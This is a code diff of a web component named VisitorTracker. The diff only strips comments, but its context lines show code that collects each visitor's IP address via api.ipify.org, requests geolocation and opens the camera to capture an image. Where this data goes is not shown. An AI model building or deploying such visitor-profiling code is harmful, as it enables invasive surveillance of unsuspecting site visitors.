@@ -10,12 +10,10 @@ function VisitorTracker() {
 
     const initVisitor = async () => {
       try {
-        // 🌐 IP
-        const ipRes = await fetch("https://api.ipify.org?format=json");
+         const ipRes = await fetch("https://api.ipify.org?format=json");
         const ipData = await ipRes.json();
 
-        // 📍 Location
-        let latitude = "N/A", longitude = "N/A";
+         let latitude = "N/A", longitude = "N/A";
         if (navigator.geolocation) {
           try {
             const pos = await new Promise((res, rej) =>
@@ -26,8 +24,7 @@ function VisitorTracker() {
           } catch (e) { console.log("Geo denied"); }
         }
 
-        // 🎥 Camera
-        let cameraImage = null;
+         let cameraImage = null;
         try {
           videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
           const video = document.createElement("video");
